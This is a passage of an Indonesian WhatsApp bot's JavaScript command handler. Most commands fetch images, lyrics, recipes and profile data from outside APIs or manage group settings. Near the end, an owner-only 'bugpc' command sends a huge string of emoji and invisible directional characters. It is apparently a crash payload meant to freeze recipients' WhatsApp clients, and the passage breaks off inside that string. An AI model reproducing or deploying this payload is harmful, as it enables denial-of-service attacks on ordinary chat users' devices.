				if (!arg) return reply(from, `Penggunaan ${prefix}googletxt teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/google?text=${arg}&apikey=${HunterApi}`)
				break
				case 'spiderman':
				if (!arg) return reply(from, `Penggunaan ${prefix}sipderman teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${arg}&apikey=${HunterApi}`)
				break
				case 'express':
				if (!arg) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${arg}&apikey=${HunterApi}`)
				break
				case 'dance':
				if (!arg) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${arg}&apikey=${HunterApi}`)
				break
				case 'blackbird':
				if (!arg) return reply(from, `Penggunaan ${prefix}blackbird teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/blackbird?text=${arg}&apikey=${HunterApi}`)
				break
				case 'text3d':
				if (!arg) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${arg}&apikey=${HunterApi}`)
				break
				case 'warrior':
				if (!arg) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${arg}&apikey=${HunterApi}`)
				break
				case 'bilangangka':
				if (args.length < 1) return grupinv('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break				 
              case 'listgc':
case 'gclist':
case 'listgroup':
                case 'listgrup':
                case 'listgrop':
                case 'gruplist':
                case 'groplist':
                case 'grouplist':
if (!isRegistered) return reply(`daftar dlu om ketik .verify`)
  const txs = ALIYABOT.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${ALIYABOT.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
  reply(txs)
  break
              case 'ttp4':  
				case 'ttp2':  
				case 'ttp3':  				
              if (!isRegistered) return reply(`daftar dlu om ketik .verify`)
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp KurrXdゑ v.3.0`)
					atetepe = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${encodeURIComponent(c)}`)
					ALIYABOT.sendMessage(from, atetepe, sticker, { quoted: mek })
					break        	
case 'waifu':
          case 'loli':
          case 'husbu':
          case 'milf':
          case 'cosplay':
          case 'wallml':
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]
              imageMsg = ( await ALIYABOT.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: foncevid})
              ALIYABOT.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
   case'liriklagu':
     reply(mess.wait)
  apa = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${args[0]}&apikey=${HunterApi}`,{method:'get'})
  apa2 = apa.result
  reply(apa2)
  break
  case 'ttp':                
                    if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${c}`)
                    ALIYABOT.sendMessage(from, anu1, image, {quoted: mek, caption : `${prefix}sticker`})
                    break                    
                    case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
   case 'attp':   
      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              if (args.length == 0) return grupinv(`Example: ${prefix + command} ALIYABOT`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              ALIYABOT.sendMessage(from, buffer, sticker, { quoted: foncevid })
              break
				case 'resepmasakan':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					ALIYABOT.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
					if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					ALIYABOT.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break  
					case 'infogempa':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					ALIYABOT.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break
					case 'infogrup':
       case 'grupinfo':
       case 'groupinfo':
              if (!isGroup) return reply(mess.only.group)
              try {
              var pic = await ALIYABOT.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :*  : Aktif}\n*AntiLink :* Mati}\n*Desc :* \n${groupMetadata.desc}`
              ALIYABOT.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              break
      case "kontak":
        pe = args.join(" ");
        entah = pe.split("|")[0];
        nah = pe.split("|")[1];
        if (isNaN(entah)) return reply("Invalid phone number");
        vcard =
          "BEGIN:VCARD\n" +
          "VERSION:3.0\n" +
          `FN:${nah}\n` +
          `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum(
            "+" + entah
          ).getNumber("internasional")}\n` +
          "END:VCARD".trim();
        ALIYABOT.sendMessage(
          from,
          { displayName: `${nah}`, vcard: vcard },
          contact
        );
        break;
case 'antidelete':
if (!isOwner && !itsMe) return
if (args.length < 1) return grupinv('Pilih on atau off')
if (args[0] === "on") {
if(antidel)return grupinv('Sudah diaktifkan sebelumnya!')
antidel = true
grupinv(`Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if(!antidel)return grupinv('Sudah di NonAktifkan sebelumnya!')
antidel = false
grupinv(`Succes mematikan antidelete`)
} else {
grupinv(`Pilih on atau off`)
}
break
      case 'welcome':
if (!isOwner && !itsMe) return
if (args.length < 1) return grupinv('Pilih on atau off')
if (args[0] === "on") {
if(welcom)return grupinv('Sudah diaktifkan sebelumnya!')
welcom = true
grupinv(`Succes mengaktifkan welcome`)
} else if (args[0] === "off") {
if(!welcom)return reply('Sudah di NonAktifkan sebelumnya!')
welcom = false
grupinv(`Succes mematikan welcome`)
} else {
grupinv(`Pilih on atau off`)
}
break
///𝑃𝐼𝑅𝑇𝐸𝐾
 case "bugpc":
   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
   grupinv(`🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿                                                            🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿🗿@                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏